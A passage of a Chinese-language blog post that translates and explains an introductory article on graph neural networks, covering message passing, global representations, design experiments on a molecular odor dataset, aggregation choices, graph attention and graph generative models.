src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_vbWYkvFanZ.png"></p><blockquote><p>从这个点相邻的边中收集信息。</p></blockquote><p>因此，如果我们只有边的特征，并且试图预测二分类节点信息，我们可以使用池化将信息路由（或传递）到它需要去的地方。该模型如下所示。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_uSr14nIAY4.png"></p><p>如果我们只有节点级的特征，并且试图预测二分类边信息，则模型如下所示。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_S381a_n2hs.png"></p><p>此类场景的一个示例是我们在“边级别任务”子部分中指定的边缘任务。节点可以被识别为图像实体，我们正在尝试对顶点进行二分类。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_xsn633-ibJ.png"></p><blockquote><p>这是预测分子性质的常见情况。例如，我们有原子信息、连通性，我们想知道分子的毒性（有毒&#x2F;无毒），或者它是否具有特定的气味（玫瑰&#x2F;非玫瑰）。</p></blockquote><p>在我们的示例中，分类模型$c$可以很容易地替换为任何可微模型，或者使用广义线性模型适应多类分类。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_tQxM_wRI0M.png"></p><blockquote><p>使用 <code>GNN</code>模型的端到端预测任务。</p></blockquote><p>现在我们已经证明了我们可以构建一个简单的<code>GNN</code>模型，并通过在图形的不同部分之间路由信息来进行二元预测。这种池化技术将作为构建更复杂的<code>GNN</code>模型的构建块。如果我们有新的图形属性，我们只需要定义如何将信息从一个属性传递到另一个属性。</p><p>请注意，在这个最简单的 <code>GNN</code>公式中，我们根本没有在 <code>GNN</code>层内部使用图形的连通性。每个节点都是独立处理的，每个边以及全局上下文都是独立处理的。我们仅在汇集信息进行预测时才使用连通性。</p><h2 id="6-3-在图形的各个部分之间传递消息"><a href="#6-3-在图形的各个部分之间传递消息" class="headerlink" title="6.3 在图形的各个部分之间传递消息"></a>6.3 在图形的各个部分之间传递消息</h2><p>我们可以通过在<code>GNN</code>层中使用池化来做出更复杂的预测，以便使我们学习的嵌入意识到图的连通性。我们可以使用消息传递来做到这一点，其中相邻节点或边交换信息并影响彼此的更新嵌入。</p><p>消息传递分三个步骤进行：</p><ol><li>对于图中的每个节点，收集所有相邻节点嵌入（或消息），这就是上面描述的$g$函数</li><li>通过聚合函数（如$sum$）聚合所有消息</li><li>所有池化消息都通过更新函数传递，该函数通常是学习的神经网络</li></ol><p>正如池化可以应用于节点或边一样，消息传递也可以发生在节点或边之间。这些步骤是利用图形连通性的关键。我们将在 <code>GNN</code>层中构建更详细的消息传递进行改变，从而产生具有增强表现和效果的 <code>GNN</code>模型。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image__rSr-EEiHU.png"></p><p>当应用一次时，此操作序列是最简单的消息传递 GNN 层类型。</p><p>这让人想起标准卷积：从本质上讲，消息传递和卷积是聚合和处理元素邻居信息以更新元素值的操作。在图结构中，元素是一个节点，而在图像中，元素是一个像素。但是，图结构中相邻节点的数量可以是可变的，这与图像中每个像素都有一定数量的相邻元素不同。</p><p>通过将传递<code>GNN</code>层的消息堆叠在一起，节点最终可以整合来自整个图的信息：在三层之后，一个节点拥有距离它三步远的节点的信息。</p><p>我们可以更新我们的架构图，以包含这个新的节点信息源：</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_37yaXT5EVs.png"></p><blockquote><p><code>GCN</code>架构示意图，该架构通过汇集距离为 1 度的相邻节点来更新图形的节点表示。</p></blockquote><h3 id="6-3-1-学习边表示"><a href="#6-3-1-学习边表示" class="headerlink" title="6.3.1 学习边表示"></a>6.3.1 学习边表示</h3><p>我们的数据集并不总是包含所有类型的信息（节点、边缘和全局上下文）。当我们想对节点进行预测，但我们的数据集只有边信息时，我们在上面展示了如何使用池化将信息从边缘路由到节点，但仅限于模型的最后预测步骤。我们可以使用消息传递在 GNN 层内的节点和边之间共享信息。</p><p>我们可以采用与之前使用相邻节点信息相同的方式合并来自相邻边缘的信息，即首先汇集边缘信息，使用更新函数对其进行转换，然后存储它。</p><p>然而，存储在图中的节点和边缘信息不一定具有相同的大小或形状，因此如何将它们组合起来并不清楚。一种方法是学习从边空间到节点空间的线性映射，反之亦然。或者，可以在更新功能之前将它们连接在一起。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image__tpkTS7kg6.png"></p><blockquote><p>消息传递层的架构示意图。第一步“准备”一条消息，该消息由来自边缘及其连接节点的信息组成，然后将消息“传递”到节点。</p></blockquote><p>在构建 <code>GNN</code>时，我们更新哪些图形属性以及以何种顺序更新它们是设计决策之一。我们可以选择是在边缘嵌入之前更新节点嵌入，还是相反。这是一个开放的研究领域，有各种各样的解决方案——例如，我们可以以“编织”的方式进行更新，其中，我们有四个更新的表示，它们被组合成新的节点和边表示：节点到节点（线性）、边到边（线性）、节点到边（边缘层）、边到节点（节点层）。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_IhhV2PPxOr.png"></p><blockquote><p>我们可以在GNN层中结合边缘和节点表示的一些不同方式。</p></blockquote><h3 id="6-3-2-添加全局表示"><a href="#6-3-2-添加全局表示" class="headerlink" title="6.3.2 添加全局表示"></a>6.3.2 添加全局表示</h3><p>到目前为止，我们所描述的网络存在一个缺陷：即使我们多次应用消息传递，在图中彼此相距很远的节点可能永远无法有效地相互传输信息。对于一个节点，如果我们有 k 层，信息将在最多 k 步之外传播。如果预测任务依赖于相距很远的节点或节点组，这可能是一个问题。一种解决方案是让所有节点能够相互传递信息。不幸的是，对于大型图形来说，这很快就会变得计算成本高昂（尽管这种方法被称为“虚拟边缘”，已被用于分子等小型图形）。</p><p>此问题的一种解决方案是使用图形（U） 的全局表示，该图形有时称为<strong>主节点</strong>或上下文向量。这个全局上下文向量连接到网络中的所有其他节点和边，并且可以充当它们之间的桥梁来传递信息，从而为整个图形构建表示。这创建了比以其他方式学习的更丰富、更复杂的图形表示。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_ESud7vRbvz.png"></p><blockquote><p>利用全局表示的图形网络架构示意图。</p></blockquote><p>在这个视图中，所有图形属性都学习了表示，因此我们可以在池化过程中通过调节我们感兴趣的属性相对于其余属性的信息来利用它们。例如，对于一个节点，我们可以考虑来自相邻节点、连接边和全局信息的信息。为了在所有这些可能的信息源上调节嵌入的新节点，我们可以简单地将它们连接起来。此外，我们还可以通过线性映射将它们映射到同一空间，然后添加它们或应用特征调制层，这可以被认为是一种特殊的注意力机制。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_-8WGYexIXC.png"></p><blockquote><p>基于其他三个嵌入（相邻节点、相邻边、全局）调节一个节点信息的原理图。此步骤对应于 Graph Nets 层中的节点操作。</p></blockquote><hr><h1 id="7-GNN实验"><a href="#7-GNN实验" class="headerlink" title="7 GNN实验"></a>7 GNN实验</h1><p>我们在这里描述了各种各样的 GNN 组件，但它们在实践中实际上有何不同？这个 GNN playground让你可以看到这些不同的组件和架构如何有助于 GNN 学习真实任务的能力。</p><p>我们的 Playground 展示了一个带有小分子图的图形级预测任务。我们使用 Leffingwell 气味数据集，它由具有相关气味感知（标签）的分子组成。预测分子结构（图形）与其气味的关系是一个跨越化学、物理学、神经科学和机器学习的 100 年历史的问题。</p><p>为了简化这个问题，我们只考虑每个分子一个二进制标签，根据专业调香师的标记，对分子图是否闻起来“刺鼻”进行分类。如果一个分子具有强烈、醒目的气味，我们就说它具有“刺鼻”的气味。例如，可能含有“烯丙醇”分子的大蒜和芥末就具有这种品质。分子 <code>piperitone</code>通常用于薄荷味糖果，也被描述为具有刺激性气味。</p><p>我们将每个分子表示为一个图形，其中原子是包含其原子身份（碳、氮、氧、氟）的独热编码的节点，键是包含一热编码其键类型（单键、双键、三键或芳香族）的边。</p><p>我们将使用顺序GNN层构建针对此问题的通用建模，然后使用带有Sigmoid激活的线性模型进行分类。我们的 GNN 的设计空间有许多可以自定义模型的组件：</p><ol><li><strong>GNN 层数</strong>：也称为深度</li><li><strong>更新时每个属性的维度</strong>：更新函数是一个 1 层 MLP，具有 relu 激活函数和用于激活归一化的层范数</li><li><strong>池化中使用的聚合函数</strong>：最大值、平均值或总和</li><li><strong>更新的图形属性</strong>：或消息传递的样式：节点、边和全局表示。我们通过布尔开关（打开或关闭）来控制它们。基线模型将是一个与图形无关的 GNN（所有消息传递），它将最后的所有数据聚合到一个单一的全局属性中。切换所有消息传递函数会产生 GraphNets 架构</li></ol><p>为了更好地理解GNN如何学习图形的任务优化表示，我们还研究了GNN的倒数第二层激活。这些“图嵌入”是 GNN 模型在预测之前的输出。由于我们使用广义线性模型进行预测，因此线性映射足以让我们了解我们如何围绕决策边界学习表示。</p><p>由于这些是高维向量，我们通过主成分分析（PCA）将它们简化为二维。一个完美的模型可以查看单独的标记数据，但由于我们正在降低维度并且也有不完美的模型，所以这个边界可能更难看到。</p><p>尝试使用不同的模型架构来构建您的直觉。例如，查看是否可以编辑左侧的分子以增加模型预测。对于不同的模型架构，相同的编辑是否具有相同的效果？</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_wRS-X5R0ho.png"></p><blockquote><p>编辑分子以查看预测如何变化，或更改模型参数以加载不同的模型。在散点图中选择不同的分子。</p></blockquote><h2 id="7-1-一些经验性的GNN设计经验"><a href="#7-1-一些经验性的GNN设计经验" class="headerlink" title="7.1 一些经验性的GNN设计经验"></a>7.1 一些经验性的GNN设计经验</h2><p>在探索上述架构选择时，您可能已经发现某些模型比其他模型具有更好的性能。是否有一些明确的GNN设计选择会给我们带来更好的性能？例如，较深的GNN模型是否比较浅的GNN模型表现更好？或者在聚合函数之间是否有明确的选择？答案将取决于数据，甚至特征化和构建图形的不同方式也会给出不同的答案。</p><p>通过下面的交互式图形，我们探索了 GNN 架构的空间以及在几个主要设计选择中执行此任务的性能：消息传递的样式、嵌入的维度、层数和聚合操作类型。</p><p>散点图中的每个点都代表一个模型：$x$轴是可训练变量的数量，$y $轴是性能。将鼠标悬停在某个点上可查看 GNN 架构参数。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_JjK7uZZ10p.png"></p><blockquote><p>每个模型的性能与其可训练变量数量的散点图。将鼠标悬停在某个点上可查看 GNN 架构参数。</p></blockquote><p>首先要注意的是，令人惊讶的是，更多的参数确实与更高的性能相关。GNN是一种参数效率非常高的模型类型：即使是少量的参数（$3k$），我们已经可以找到高性能的模型。</p><h3 id="7-1-1-不同属性嵌入"><a href="#7-1-1-不同属性嵌入" class="headerlink" title="7.1.1 不同属性嵌入"></a>7.1.1 不同属性嵌入</h3><p>接下来，我们可以查看基于不同图形属性的学习表示的维度聚合的性能分布。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_0oAfSsL-oP.png"></p><blockquote><p>在不同的节点、边缘和全局维度上聚合模型的性能。</p></blockquote><p>我们可以注意到，维数较高的模型往往具有更好的均值和下限性能，但在最大值下没有发现相同的趋势。可以找到一些性能最佳的模型用于较小的尺寸。由于维数越高，参数数量越多，因此这些观测值与上图相辅相成。</p><h3 id="7-1-2-不同层数"><a href="#7-1-2-不同层数" class="headerlink" title="7.1.2 不同层数"></a>7.1.2 不同层数</h3><p>接下来，我们可以看到基于 GNN 层数的性能细分。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_OtIOQrSXnm.png"></p><blockquote><p>层数与模型性能的关系图，以及模型性能与参数数量的散点图。每个点都由层数着色。</p></blockquote><p>箱形图显示了类似的趋势，虽然平均性能往往随着层数的增加而增加，但性能最好的模型没有三层或四层，而是两层。此外，性能的下限随着四层的增加而降低。这种效应之前已经观察到，层数更多的GNN将在更远的距离上广播信息，并且可能会冒着其节点表示在许多连续迭代中被“稀释”的风险。</p><h3 id="7-1-3-不同汇聚操作"><a href="#7-1-3-不同汇聚操作" class="headerlink" title="7.1.3 不同汇聚操作"></a>7.1.3 不同汇聚操作</h3><p>我们的数据集是否有首选的聚合操作？下图根据聚合类型对性能进行了细分。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_a_55w_xDjJ.png"></p><blockquote><p>聚合类型与模型性能的图表，以及模型性能与参数数量的散点图。每个点都按聚合类型着色。</p></blockquote><p>总体而言，$sum $似乎对$  mean  $性能有非常轻微的改进，但$  max  $或$  mean  $可以给出同样好的模型。在查看 aggregation operations 的判别&#x2F;表达能力时，这对于上下文很有用。</p><p>之前的探索给出了好坏参半的信息。我们可以找到平均趋势，其中复杂性越高，性能越好，但我们可以找到明显的反例，其中参数、层数或维度较少的模型表现更好。一个更明显的趋势是关于相互传递信息的属性数量。</p><h3 id="7-1-4-不同消息传递类型"><a href="#7-1-4-不同消息传递类型" class="headerlink" title="7.1.4 不同消息传递类型"></a>7.1.4 不同消息传递类型</h3><p>在这里，我们根据消息传递的样式对性能进行细分。在这两个极端，我们考虑了在图形实体（“none”）之间不通信的模型和在节点、边和全局变量之间传递消息的模型。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image__7PfTDb72b.png"></p><blockquote><p>消息传递与模型性能的关系图，以及模型性能与参数数量的散点图。每个点都由消息传递着色。</p></blockquote><p>总的来说，我们看到，图形属性进行通信的次数越多，平均模型的性能就越好。我们的任务以全局表示为中心，因此明确学习此属性也往往会提高性能。我们的节点表示似乎也比边表示更有用，这是有道理的，因为这些属性中加载了更多信息。</p><p>从这里开始，您可以采取许多方向来获得更好的性能。我们希望其中两个突出两个大方向，一个与更复杂的图形算法相关，另一个与图形本身有关。</p><p>到目前为止，我们的 GNN 是基于邻域的池化操作。有一些图形概念很难用这种方式表达，例如线性图形路径（连接的节点链）。设计新的机制，使图信息可以在GNN中被提取、执行和传播，这是当前的一个研究领域。</p><p>GNN研究的前沿之一不是制作新的模型和架构，而是“如何构建图形”，更准确地说，为图形注入可以利用的附加结构或关系。正如我们粗略地看到的，图形属性传达的次数越多，我们就越倾向于拥有更好的模型。在这种特殊情况下，我们可以考虑通过在节点之间添加额外的空间关系，添加不是键的边缘，或者在子图之间明确学习关系，使分子图的特征更加丰富。</p><hr><h1 id="8-相关技术"><a href="#8-相关技术" class="headerlink" title="8 相关技术"></a>8 相关技术</h1><p>接下来，我们将介绍与GNN相关的无数与图结构相关的主题。</p><h2 id="8-1-其他类型的图"><a href="#8-1-其他类型的图" class="headerlink" title="8.1 其他类型的图"></a>8.1 其他类型的图</h2><p>虽然我们只描述了每个属性的矢量化信息的图形，但图形结构更灵活，可以容纳其他类型的信息。幸运的是，消息传递框架足够灵活，以至于将 GNN 适应更复杂的图形结构通常是为了定义新的图形属性如何传递和更新信息。</p><p>例如，我们可以考虑多边图或多重图，其中一对节点可以共享多种类型的边，当我们想要根据节点的类型以不同的方式对节点之间的交互进行建模时，就会发生这种情况。例如，对于社交网络，我们可以根据关系类型（熟人、朋友、家人）指定边缘类型。GNN 可以通过为每种边类型设置不同类型的消息传递步骤来进行调整。我们还可以考虑嵌套图，例如，节点代表一个图，也称为超节点图。嵌套图可用于表示层次结构信息。例如，我们可以考虑一个分子网络，其中节点代表一个分子，如果我们有一种将一个分子转化为另一个分子的方法（反应），那么两个分子之间共享一条边。在这种情况下，我们可以通过让一个 GNN 在分子水平上学习表示，另一个在反应网络水平上学习表示，并在训练期间在它们之间交替学习。</p><p>另一种类型的图是超图，其中边可以连接到多个节点，而不仅仅是两个节点。对于给定的图，我们可以通过识别节点社区并分配连接到社区中所有节点的超边来构建超图。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_-gPj-dJDAl.png"></p><blockquote><p>更复杂图形的示意图。在左边，我们有一个多图的例子，它有三种边类型，包括有向边。在右边，我们有一个三级层次结构图，中间级节点是超节点。</p></blockquote><h2 id="8-2-GNN-中的采样图和批处理"><a href="#8-2-GNN-中的采样图和批处理" class="headerlink" title="8.2 GNN 中的采样图和批处理"></a>8.2 GNN 中的采样图和批处理</h2><p>训练神经网络的一种常见做法是使用在训练数据的随机常数大小（批量大小）子集（小批量）上计算的梯度来更新网络参数。这种做法给图形带来了挑战，因为彼此相邻的节点和边的数量是可变的，这意味着我们不能有一个恒定的批量大小。使用图形进行批处理的主要思想是创建子图，以保留较大图形的基本属性。这种图形采样操作高度依赖于上下文，并涉及从图形中子选择节点和边。这些操作在某些情况下（引文网络）可能有意义，而在其他上下文中，这些操作可能太强了（分子，其中子图仅代表一个新的、更小的分子）。如何对图表进行采样是一个开放的研究问题。</p><p>如果我们关心在邻域级别保持结构，一种方法是随机采样统一数量的节点，即我们的节点集。然后添加与节点集相邻的距离为$  k  $的相邻节点，包括它们的边。</p><p>每个邻域都可以被视为一个单独的图，GNN 可以在这些子图的批次上进行训练。可以忽略损失，只考虑节点集，因为所有相邻节点都有不完整的邻域。更有效的策略可能是首先随机抽取单个节点，将其邻域扩展到距离$  k  $，然后在扩展集内选择另一个节点。一旦构造了一定数量的节点、边或子图，就可以终止这些操作。如果上下文允许，我们可以通过选择初始节点集，然后对恒定数量的节点进行子采样（例如随机，或通过随机游走或 Metropolis 算法）来构建恒定大小的邻域。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_FZiAZGMY4X.png"></p><blockquote><p>对同一图形进行采样的四种不同方法。抽样策略的选择在很大程度上取决于上下文，因为它们将生成不同的图形统计信息分布（# 节点、#edges 等）。对于高度连通的图形，还可以对边进行二次采样。</p></blockquote><p>当图形足够大以至于无法放入内存中时，对图形进行采样尤为重要。激发新的架构和培训策略，例如 Cluster-GCN，我们预计图形数据集的规模将在未来继续增长。</p><h2 id="8-3-归纳偏置"><a href="#8-3-归纳偏置" class="headerlink" title="8.3 归纳偏置"></a>8.3 归纳偏置</h2><p>在构建模型以解决特定类型的数据上的问题时，我们希望将模型专业化以利用该数据的特征。当这成功完成时，我们通常会看到更好的预测性能、更短的训练时间、更少的参数和更好的泛化。</p><p>例如，在对图像进行标记时，我们希望利用这样一个事实，即无论它在图像的左上角还是右下角，狗仍然是狗。因此，大多数图像模型使用卷积，卷积是平移不变的。对于文本，标记的顺序非常重要，因此递归神经网络按顺序处理数据。此外，一个标记（例如“not”一词）的存在会影响句子其余部分的含义，因此我们需要能够“参与”文本其他部分的组件，而 BERT 和 GPT-3 等转换器模型可以做到这一点。这些是归纳偏差的一些例子，在这些例子中，我们正在识别数据中的对称性或规律性，并添加利用这些属性的建模组件。</p><p>在图的情况下，我们关心每个图分量（边、节点、全局）如何相互关联，因此我们寻找具有关系归纳偏差的模型。</p><p>模型应保留实体之间的显式关系（邻接矩阵）并保持图对称性（排列不变性）。我们预计实体之间交互很重要的问题将从图形结构中受益。具体来说，这意味着在集合上设计转换：节点或边上的操作顺序无关紧要，操作应该适用于可变数量的输入。</p><h2 id="8-4-比较聚合操作"><a href="#8-4-比较聚合操作" class="headerlink" title="8.4 比较聚合操作"></a>8.4 比较聚合操作</h2><p>汇集来自相邻节点和边缘的信息是任何相当强大的 GNN 架构中的关键步骤。由于每个节点的邻居数目都是可变的，并且由于我们想要一种可微分的方法来聚合此信息，因此我们希望使用与节点排序和提供的节点数无关的平滑聚合操作。</p><p>选择和设计最佳聚合操作是一个开放的研究课题。聚合操作的一个理想属性是相似的输入提供相似的聚合输出，反之亦然。一些非常简单的候选排列不变运算是 sum、mean 和 max。方差等汇总统计量也有效。所有这些都采用可变数量的 inputs，并提供相同的 output，无论 input ordering如何。让我们来探讨一下这些操作之间的区别。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_Njnzgc8a32.png"></p><blockquote><p>没有池化类型可以始终区分图形对，例如左侧的 max pooling 和右侧的 sum &#x2F; mean pooling。</p></blockquote><p>没有一个操作是绝对的最佳选择。当节点的相邻要素数量高度可变或您需要局部邻域特征的标准化视图时，均值运算可能很有用。当您想要高亮显示局部邻域中的单个突出要素时，max 操作可能非常有用。Sum 通过提供特征的局部分布的快照，在这两者之间提供平衡，但由于它未归一化，因此也可以突出显示异常值。在实践中，通常使用 sum。</p><p>设计聚合操作是一个开放的研究问题，它与集合上的机器学习相交。新方法，例如 Principal Neighborhood 聚合通过连接多个聚合操作并添加一个扩展函数来考虑这些操作，该函数取决于要聚合的实体的连接程度。同时，还可以设计特定于域的聚合操作。一个例子是 “Tetrahedral Chirality” 聚合运算符。</p><h2 id="8-5-GCN-作为子图函数近似器"><a href="#8-5-GCN-作为子图函数近似器" class="headerlink" title="8.5 GCN 作为子图函数近似器"></a>8.5 GCN 作为子图函数近似器</h2><p>使用 1 度邻居查找查看 k 层的 GCN（和 MPNN）的另一种方法是作为神经网络，该网络对大小为 k 的子图的学习嵌入进行操作。</p><p>当关注一个节点时，在 k 层之后，更新的节点表示具有所有邻居的有限视点，直到 k 距离，本质上是子图表示。边表示也是如此。</p><p>因此，GCN 正在收集所有可能的大小为 k 的子图，并从一个节点或边的有利位置学习向量表示。可能的子图的数量可以组合增长，因此从头开始枚举这些子图与像在 GCN 中那样动态构建它们可能会令人望而却步。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_pAFSwvkXrT.png"></p><h2 id="8-6-边和图形对偶"><a href="#8-6-边和图形对偶" class="headerlink" title="8.6 边和图形对偶"></a>8.6 边和图形对偶</h2><p>需要注意的一点是，边预测和节点预测虽然看起来不同，但通常归结为同一个问题：图$G$上的边预测任务可以表述为对的对偶的$G$节点级预测。</p><p>为了获得$G$的对偶，我们可以奖节点转换为边（将边转换为节点）。图形及其对偶包含相同的信息，只是以不同的方式表示。有时，此属性使一种表示中的问题比另一种表示中的问题更容易，例如傅里叶空间中的频率。 简而言之，要解决$G$上的边分类问题，可以考虑对$G$的dual 进行图卷积（这与$G$上的学习边表示相同），这个想法是用Dual-Primal Graph Convolutional Networks 开发的。</p><h2 id="8-7-将图卷积作为矩阵乘法，将矩阵乘法作为在图上的游走"><a href="#8-7-将图卷积作为矩阵乘法，将矩阵乘法作为在图上的游走" class="headerlink" title="8.7 将图卷积作为矩阵乘法，将矩阵乘法作为在图上的游走"></a>8.7 将图卷积作为矩阵乘法，将矩阵乘法作为在图上的游走</h2><p>我们已经讨论了很多关于图卷积和消息传递的内容，当然，这就提出了一个问题，即我们如何在实践中实现这些操作？在本节中，我们将探讨矩阵乘法、消息传递及其与遍历图形的一些连接。</p><p>我们要说明的第一点是，具有大小$n_{\text {nodes }} \times node <em>{\text {dim }}$为节点特征矩阵$X$的相邻矩阵$An</em>{\text {nodes }} \times n_{\text {nodes }}$的矩阵乘法实现了使用求和聚合的简单消息传递。设矩阵为$B&#x3D;AX$，我们可以观察到任何条目$B_{ij}$都可以表示为</p><p>$$<br>&lt;A_{\text {row }<em>{i}} \dot{X}<em>{\text {column }</em>{j}}&gt;&#x3D;A</em>{i, 1} X_{1, j}+A_{i, 2} X_{2, j}+\ldots+A_{i, n} X_{n, j}&#x3D;\sum_{A_{i, k}&gt;0} X_{k, j}<br>$$</p><p>因为$A_{i,k}$只有当和$node_k$之间存在边时$node_i$，才为1，所以内积本质上是收集维度$j$的所有节点特征值，这些值与$node_i$共享一条边。应该注意的是，此消息传递不会更新节点特征的表示，而只是池化相邻节点特征。但是这可以通过在矩阵乘法之前或之后通过$X$你最喜欢的可微变换（例如MLP）来轻松适应。</p><p>从这个角度来看，我们可以体会到使用邻接列表的好处。由于对$A$预期的稀疏性 ， 我们不必对$A_{i,j}$为0的所有值求和。只要我们有基于索引收集值的操作，我们应该能够只检索正条目。此外，这种无矩阵乘法使我们无需使用求和作为聚合运算。</p><p>我们可以想象，多次应用此操作可以让我们在更远的距离传播信息。从这个意义上说，矩阵乘法是遍历图的一种形式。当我们查看邻接矩阵的幂$A^K$时，这种关系也很明显。如果我们考虑矩阵$A^2$，项$A_{ij}^2$计算从$node_i$到$node_j$的所有长度为2的路径，并且可以表示为内积：</p><p>$$<br>&lt;A_{\text {rou }<em>{i}}, A_{\text {column }_{j}}&gt;&#x3D;A</em>{i, 1} A_{1, j}+A_{i, 2} A_{2, j}+\ldots+A_{i, n} A_{n, j}<br>$$</p><p>直觉是，第一项$a_{i,1}a_{1,j}$仅在两个条件下为正，一条边连接$node_i$和$node_1$，另一条边连接$node_ 1$和$node_j$。换句话说，两条边形成一条长度为 2 的路径，该路径从$node_i$经过$node_1$连接到$node_j$。由于求和，我们正在计算所有可能的中间节点。当我们考虑$A^3&#x3D;AA^2$时，这种直觉会延续下来以此类推至$A^k$。</p><p>关于我们如何将矩阵视为要探索的图形，存在更深层次的联系。</p><h2 id="8-8-注意力网络"><a href="#8-8-注意力网络" class="headerlink" title="8.8 注意力网络"></a>8.8 注意力网络</h2><p>在 graph 属性之间传递信息的另一种方式是通过 attention。例如，当我们考虑一个节点及其 1 度相邻节点的和聚合时，我们也可以考虑使用加权和。然后，挑战在于以排列不变的方式关联权重。一种方法是考虑一个标量评分函数，该函数根据节点对$f(node_i,node_j)$分配权重。在这种情况下，评分函数可以解释为测量相邻节点与中心节点的相关性的函数。权重可以标准化，例如使用 softmax 函数将大部分权重集中在与任务相关的节点最相关的邻居上。这个概念是 Graph Attention Networks （GAT） 的基础保留排列不变性，因为评分适用于成对的节点。一个常见的评分函数是内积，在评分之前，通常会通过线性映射将节点转换为查询和关键向量，以提高评分机制的表达能力。此外，为了可解释性，评分权重可以用作衡量边缘相对于任务的重要性的度量。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_CFUbTIlvOQ.png"></p><blockquote><p>一个节点相对于其相邻节点的注意力示意图。对于每条边，都会计算、规范化交互分数，并用于对节点嵌入进行加权。</p></blockquote><p>此外，Transformer可以被视为具有注意力机制的 GNN。在这个视图下，transformer 将几个元素（即字符标记）建模为全连接图中的节点，并且注意力机制为每个节点对分配边缘嵌入，用于计算注意力权重。区别在于实体之间连接的假设模式，GNN 假设稀疏模式，而 Transformer 对所有连接进行建模。</p><h2 id="8-9-图表解释和归属"><a href="#8-9-图表解释和归属" class="headerlink" title="8.9 图表解释和归属"></a>8.9 图表解释和归属</h2><p>在直接部署 GNN 时，我们可能会关心模型的可解释性，以建立可信度、调试或科学发现。我们想要解释的图形概念因上下文而异。例如，对于分子，我们可能关心特定子图的存在与否，而在引文网络中，我们可能关心文章的关联程度。由于图形概念的多样性，构建解释的方法有很多种。GNNExplainer将此问题转换为提取对任务最重要的最相关的子图。归因技术将 Ranked importance 值分配给与任务相关的图表部分。由于可以综合生成现实且具有挑战性的图形问题，因此 GNN 可以作为评估归因技术的严格且可重复的测试平台。</p><p><img src="/2024/08/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB3%EF%BC%9AGNN/image_yWJ6TZuhT8.png"></p><blockquote><p>图表上的一些可解释性技术的示意图。归因将排名值分配给图表属性。排名可以用作提取可能与任务相关的连接子图的基础。</p></blockquote><h2 id="8-10-生成模型"><a href="#8-10-生成模型" class="headerlink" title="8.10 生成模型"></a>8.10 生成模型</h2><p>除了学习图上的预测模型外，我们可能还关心学习图的生成模型。使用生成模型，我们可以通过从学习的分布中采样或通过完成给定起点的图形来生成新图形。一个相关的应用是新药的设计，其中需要具有特定特性的新型分子图作为治疗疾病的候选者。</p><p>图形生成模型的一个关键挑战在于对图形的拓扑进行建模，图形的大小可能会有很大差异并且有$N_{nodes}^2$项。一种解决方案是使用自动编码器框架直接对临界矩阵进行建模，就像对图像进行建模一样。对边缘是否存在的预测被视为二分类任务。可以通过仅预测已知边和不存在的边的子集来避免该$N_{nodes}^2$。graphVAE 学习对邻接矩阵中的正连接模式和一些非连接模式进行建模。</p><p>另一种方法是按顺序构建图形，从图形开始，然后迭代地应用离散操作，例如增加或减少节点和边缘。为了避免估计离散行动的梯度，我们可以使用策略梯度。这是通过自回归模型完成的，例如 RNN，或者在强化学习场景中。此外，有时可以将图形建模为仅包含语法元素的序列。</p><hr><h1 id="9-结论"><a href="#9-结论" class="headerlink" title="9 结论"></a>9 结论</h1><p>图形是一种强大而丰富的结构化数据类型，其优势和挑战与图像和文本截然不同。在本文中，我们概述了研究人员在构建基于神经网络的图形处理模型时提出的一些里程碑。我们已经介绍了使用这些架构时必须做出的一些重要设计选择，希望 GNN playground 可以直观地了解这些设计选择的经验结果是什么。近年来 GNN 的成功为各种新问题创造了巨大的机会，我们很高兴看到该领域将带来什么。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理第4章：存储器</title>
